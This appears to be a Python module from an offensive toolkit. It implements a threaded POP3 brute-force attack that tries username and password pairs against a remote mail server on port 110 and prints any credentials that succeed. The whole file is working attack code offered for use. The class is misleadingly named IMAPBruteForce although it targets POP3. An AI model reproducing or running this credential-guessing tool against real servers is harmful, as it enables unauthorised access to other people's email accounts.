import poplib

from bruteforce_login import ThreadedBruteForceLogin


class IMAPBruteForce(ThreadedBruteForceLogin):

    def __init__(self):
        super().__init__("pop3_bruteforce",
                         ["pop3", "email", "bruteforce"],
                         "brute force pop3 logins",
                         port=110)

    def login(self, username: str, password: str):
        try:
            with poplib.POP3(self.rhost, self.rport, self.timeout) as server:
                server.login(username, password)

                print(f"[+] password found: {username}:{password}")
                return True
        except poplib.error_proto:
            pass

        if self.verbose:
            print(f"[-] incorrect credentials: {username}:{password}")

        return False
